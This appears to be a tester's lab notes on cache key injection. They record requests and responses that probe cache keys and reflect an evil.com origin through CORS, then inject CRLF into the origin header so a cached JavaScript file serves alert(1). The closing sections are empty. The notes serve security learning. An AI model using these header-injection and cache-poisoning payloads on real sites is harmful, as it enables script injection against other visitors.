# Note(Datetime, Name) :  Cache Key Injection

### Metodelogy
 1. Investigate the system to retrieve a list of features
 2. Discribe the feature and explain how it works
 3. List possible vulnerabilities and group by feature
 4. Proof of concept for possible vulnerabilities
 5. What is the impact of the vulnerabilities after the proof of concept ? 


# ==========================================================================================================

>

## feature:      
1. Login -> redirected to user login page   /login/?lang=en
### steps taken:
1. GET /login/?lang=en with request payload   ->   noting happend, evil.com and Pragma: x-get-cache-key not reflected
request:
``` 
X-Forwarded-Host: evil.com
Pragma: x-get-cache-key  
```
response:  
```
HTTP/1.1 200 OK
Cache-Control: no-cache
Content-Type: text/html; charset=utf-8
Vary: origin
X-Frame-Options: SAMEORIGIN
Connection: close
Content-Length: 3343

```
2. GET /  ->  redirected to /login?lang=en and page is cacheable 
3. GET / with payload  -> got response X-Cachge-Key , that indicated the page was cache using key /$$
request:
```
Pragma: x-get-cache-key

```
response : 
```
HTTP/1.1 302 Found
Location: /login?lang=en
Vary: origin
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 27
X-Cache-Key: /$$
X-Cache: hit
Connection: close
Content-Length: 0


```
4. GET /with payload  -> X-Cache-Key is change follow like this /$$origin=evil
### request:
```
origin: evil
Pragma: x-get-cache-key

```
### response:
```
HTTP/1.1 302 Found
Location: /login?lang=en
Vary: origin
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=35
Age: 0
X-Cache-Key: /$$origin=evil
X-Cache: miss
Connection: close
Content-Length: 0

```
5. GET /login/ with payload  -> X-Cache-Key is change to /login$$origin=evil, and Location header to /Login/
6. GET /login/?lang='%3C   -> Page is reflected but original url is santiazed become like ``` this login/?lang=&apos;&lt; ``` 
7. GET /js/localize.js?lang=en&cors=1 -> Page reflected with response header ``` Set-Cookie: session=8SvcWA6I522Y0KiWEGNKdWZttLCnkb0c; Secure; HttpOnly; SameSite=None ```
8. GET /js/localize.js?lang=en&cors=1  add header ``` origin: https://evil.com ``` -> page reflected with response like this :
### response: 
``` 
Access-Control-Allow-Origin: https://evil.com
Set-Cookie: session=KdiRewMLPsKBG2kZ7TEXnjTgOMMakuyx; Secure; HttpOnly; SameSite=None 
```

9. GET /js/localize.js?lang=en&cors=1 add header ``` origin: evil.com%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1) ``` -> that make localize content response was changed like below , that indicated i can exeture javascring  using header injected Carriage Return Line feed (CRLF)
### response:
```
HTTP/1.1 200 OK
Content-Type: application/javascript; charset=utf-8
Access-Control-Allow-Origin: evil.com
Cache-Control: max-age=35
Age: 0
X-Cache-Key: /js/localize.js?lang=en&cors=1$$origin=evil.com%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)
X-Cache: miss
Connection: close
Content-Length: 8

alert(1)
```
10. GET /login/?lang=utm_conten=%26cors=1  -> that make page change request to /js/localize.js?lang=utm_conten=&cors=1&cors=0 
11. GET /js/localize.js?lang=en&cors=1#&cors=0 -> that make server ignore the rest of url after '#' 
12. first GET /login?lang=en and second GET /login?lang=en&utm_content=2 -> second request is cache hit that mean utm_content is uncached key , `utm_content` is url tracking parameter
13. GET /login?lang=en&utm_content=%26cors=1# -> the request to /js/localize.js not change query parameter to utm_cotent like ?lang=en&utm_content=%26cors=1#
14. first GET /login?lang=en and second GET /login?lang=en?utm_content=2 -> second request is cache hit that indicated utm_content is uncached key
15. GET /js/localize.js?lang=en?utm_content=z&cors=1&t=1$$#&cors -> that make cache key like this``` x-cache-key: /js/localize.js?lang=en?cors=1&t=1$$$$origin=evil.com%0d%0aContent-Length:%208%0d%0a%0d%0aalert(1)  ```





## vulnerabilities : 
## Proof of concept:
## impact

## takeaways


